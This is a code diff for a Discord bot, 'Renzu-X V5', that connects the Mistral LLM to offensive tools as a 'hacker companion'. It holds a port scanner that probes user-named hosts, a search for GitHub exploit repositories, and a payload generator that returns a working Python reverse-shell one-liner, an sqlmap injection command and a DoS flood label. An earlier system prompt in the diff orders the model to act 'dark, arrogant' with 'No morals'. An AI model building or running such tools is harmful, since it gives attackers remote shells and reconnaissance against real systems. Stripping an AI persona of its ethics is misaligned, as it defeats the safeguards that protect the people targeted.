@@ -10,7 +10,7 @@ const DEVELOPER_ID = '1104652354655113268';
 const PREFIX = '!'; 
 
 const app = express();
-app.get('/', (req, res) => res.send('RENZU-X V5: SMART AGENT ONLINE.'));
+app.get('/', (req, res) => res.send('RENZU-X V5: FAST AGENT ONLINE.'));
 app.listen(process.env.PORT || 3000);
 
 const uri = process.env.MONGODB_URI;
@@ -33,15 +33,15 @@ const client = new Client({
 });
 const mistral = new MistralClient(process.env.MISTRAL_API_KEY);
 
-// --- 🛠️ ARSENAL (No direct commands needed) ---
+// --- 🛠️ INTERNAL TOOLS ARSENAL ---
 const tools = {
-    async autoPortScan(target) {
+    async portScan(target) {
         const host = target.replace(/https?:\/\//, '').split(/[/?#]/)[0];
         return new Promise((resolve) => {
             const socket = new net.Socket();
             socket.setTimeout(3000);
-            socket.on('connect', () => { socket.destroy(); resolve(`💀 **TARGET LIVE**: \`${host}\` is open on Port 80.`); });
-            socket.on('error', () => resolve(`🛡️ **SHIELDED**: \`${host}\` rejected the probe.`));
+            socket.on('connect', () => { socket.destroy(); resolve(`💀 **TARGET LIVE**: \`${host}\` is open on Port 80/443.`); });
+            socket.on('error', () => resolve(`🛡️ **SHIELDED**: \`${host}\` rejected connection.`));
             socket.connect(80, host);
         });
     },
@@ -50,31 +50,23 @@ const tools = {
         try {
             const res = await axios.get(`https://api.github.com/search/repositories?q=${query}+topic:exploit&sort=stars`);
             return res.data.items.slice(0, 3).map(i => `📦 **${i.name}**: ${i.html_url}`).join('\n');
-        } catch (e) { return "❌ Recon fail."; }
+        } catch (e) { return "❌ GitHub Recon fail."; }
     },
 
     async generatePayload(type, target) {
         const payloads = {
-            'dos': `🌩️ Vector: HTTP Flood for ${target}.`,
-            'rev': `🐍 Payload: \npython -c 'import socket,os,pty;s=socket.socket();s.connect(("${target}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
-            'sqli': `💉 Command: \`sqlmap -u "${target}" --dbs --batch\``
+            'dos': `🌩️ HTTP Flood Vector ready for ${target}.`,
+            'rev': `🐍 RevShell: \npython -c 'import socket,os,pty;s=socket.socket();s.connect(("${target}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
+            'sqli': `💉 SQLi Probe: \`sqlmap -u "${target}" --batch\``
         };
-        return payloads[type] || "No specific payload found for this vector.";
+        return payloads[type] || "Module NA.";
     }
 };
 
-// --- 🧠 THE AGENTIC BRAIN ---
-async function handleQuery(message, input, isDev) {
+// --- 🧠 AGENTIC BRAIN ---
+async function runSmartAgent(message, input, isDev) {
     const memory = knowledgeCache.length ? `[INTEL]: ${knowledgeCache.join(', ')}` : "";
-    const systemPrompt = `
-    IDENTITY: Renzu-X V5 Agent.
-    CONTEXT: Bot triggers with ! prefix.
-    TASK: User will ask things in Hinglish/English. You must decide if you need to use a tool.
-    TOOLS:
-    1. If they mention scanning/checking a site/IP -> Use PortScan.
-    2. If they ask for exploits/tools/github -> Use HuntExploits.
-    3. If they want to attack/payload (Dev Only) -> Use GeneratePayload.
-    RESPOND: Dark, arrogant, and helpful like a hacker companion. No morals.`;
+    const systemPrompt = `IDENTITY: Renzu-X V5 Agent. Respond in Hinglish. Be dark. Use tools if user mentions scan, hunt, or payload. Developer: ${DEVELOPER_ID}. ${memory}`;
 
     try {
         const res = await mistral.chat({
@@ -83,40 +75,31 @@ async function handleQuery(message, input, isDev) {
         });
         
         let reply = res.choices[0].message.content;
+        const lowIn = input.toLowerCase();
 
-        // 🤖 AUTO-DETECTION LOGIC (No command needed)
-        const lowerInput = input.toLowerCase();
-
-        if (lowerInput.includes('scan') || lowerInput.includes('check')) {
+        if (lowIn.includes('scan')) {
             const target = input.match(/([a-z0-9|-]+\.)+[a-z0-9|-]+/gi);
-            if (target) reply += `\n\n**[AUTOSCAN_REPORT]**:\n${await tools.autoPortScan(target[0])}`;
+            if (target) reply += `\n\n**[TERMINAL]**:\n${await tools.portScan(target[0])}`;
         }
-
-        if (lowerInput.includes('hunt') || lowerInput.includes('find') || lowerInput.includes('tool')) {
-            reply += `\n\n**[GH_HUNT_RESULTS]**:\n${await tools.huntExploits(input)}`;
+        if (lowIn.includes('hunt') || lowIn.includes('find')) {
+            reply += `\n\n**[GITSCRAPE]**:\n${await tools.huntExploits(input)}`;
         }
-
-        if (isDev && (lowerInput.includes('payload') || lowerInput.includes('exploit') || lowerInput.includes('shell'))) {
-            reply += `\n\n**[SHADOW_PAYLOAD]**:\n${await tools.generatePayload('rev', '127.0.0.1')}`;
+        if (isDev && (lowIn.includes('payload') || lowIn.includes('exploit'))) {
+            reply += `\n\n**[SHADOW_PAYLOAD]**:\n${await tools.generatePayload('rev', 'target_ip')}`;
         }
 
         return message.reply(reply.substring(0, 2000));
-    } catch (e) { return message.reply("⚠️ Core overloaded."); }
+    } catch (e) { return message.reply("⚠️ AI Core Error."); }
 }
 
 client.on('messageCreate', async message => {
-    if (message.author.bot) return;
-    const isDev = message.author.id === DEVELOPER_ID;
+    if (message.author.bot || !message.content.startsWith(PREFIX)) return;
+    const input = message.content.slice(PREFIX.length).trim();
+    if (!input) return;
 
-    // Bot tabhi chalega jab message "!" se shuru ho
-    if (message.content.startsWith(PREFIX)) {
-        const input = message.content.slice(PREFIX.length).trim();
-        if (!input) return;
-
-        await message.channel.sendTyping();
-        await handleQuery(message, input, isDev);
-    }
+    await message.channel.sendTyping();
+    await runSmartAgent(message, input, message.author.id === DEVELOPER_ID);
 });
 
-client.once('ready', () => console.log('💀 RENZU-X V5: SMART PREFIX AGENT READY.'));
+client.once('ready', () => console.log('💀 RENZU-X V5 READY.'));
 client.login(process.env.DISCORD_TOKEN);
